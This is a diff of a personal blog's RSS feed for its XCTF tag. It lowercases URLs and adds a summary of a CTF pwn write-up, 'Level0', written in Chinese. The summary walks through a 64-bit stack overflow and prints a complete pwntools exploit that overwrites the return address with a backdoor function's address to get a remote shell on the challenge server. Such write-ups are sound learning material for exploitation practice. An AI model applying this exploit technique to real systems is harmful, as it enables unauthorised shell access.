@@ -2,21 +2,39 @@
 <rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
   <channel>
     <title>XCTF on NiceSeven&#39;s Website</title>
-    <link>https://NiceSeven.github.io/tags/xctf/</link>
+    <link>https://niceseven.github.io/tags/xctf/</link>
     <description>Recent content in XCTF on NiceSeven&#39;s Website</description>
     <generator>Hugo -- gohugo.io</generator>
     <language>en-us</language>
-    <lastBuildDate>Mon, 13 Jan 2020 17:39:52 +0800</lastBuildDate>
+    <lastBuildDate>Wed, 15 Jan 2020 19:03:07 +0800</lastBuildDate>
     
-	<atom:link href="https://NiceSeven.github.io/tags/xctf/index.xml" rel="self" type="application/rss+xml" />
+	<atom:link href="https://niceseven.github.io/tags/xctf/index.xml" rel="self" type="application/rss+xml" />
     
     
     <item>
+      <title>XCTF Pwn Level0</title>
+      <link>https://niceseven.github.io/post/2020/01/15/xctf-pwn-level0/</link>
+      <pubDate>Wed, 15 Jan 2020 19:03:07 +0800</pubDate>
+      
+      <guid>https://niceseven.github.io/post/2020/01/15/xctf-pwn-level0/</guid>
+      <description>level0 首先checksec 看看开启了什么防护
+64位的程序
+开启了NX：内存栈不可执行保护机制，传入栈的数据不可直接执行，可以使用rop链绕过
+本地运行一下看看，输出一个Hello,World等待输入
+拖入IDA分析，F5反编译main函数
+进入vulnerable_function()函数
+漏洞很明显了一个80h的栈可以读入0x200的数据，明显的栈溢出
+我们查看程序有没有后门，shift+f12查看字符串存在callsystem()函数调用system(&amp;quot;/bin/sh&amp;rdquo;)
+编写exp
+#!/usr/bin/python #coding=UTF-8 from pwn import * sh = remote(&amp;#39;111.198.29.45&amp;#39;,45960) elf = ELF(&amp;#39;./level0&amp;#39;) #开启本地程序的句柄 callsystem_addr = elf.symbols[&amp;#39;callsystem&amp;#39;] #symbols函数用于获取获取一个标志的地址，这个标志可以是system函数、bss全局变量等 payload = &amp;#39;a&amp;#39;*0x80 + &amp;#39;a&amp;#39;*8 + p64(callsystem_addr) sh.recv() sh.sendline(payload) sh.interactive() 注意这里的payload填充0x80后还需要填充8个字节(64位)的数据来覆盖rbp，之后才是覆盖retn</description>
+    </item>
+    
+    <item>
       <title>XCTF-Pwn-hello pwn</title>
-      <link>https://NiceSeven.github.io/post/2020/01/13/xctf-pwn-hello-pwn/</link>
+      <link>https://niceseven.github.io/post/2020/01/13/xctf-pwn-hello-pwn/</link>
       <pubDate>Mon, 13 Jan 2020 17:39:52 +0800</pubDate>
       
-      <guid>https://NiceSeven.github.io/post/2020/01/13/xctf-pwn-hello-pwn/</guid>
+      <guid>https://niceseven.github.io/post/2020/01/13/xctf-pwn-hello-pwn/</guid>
       <description>test</description>
     </item>
     
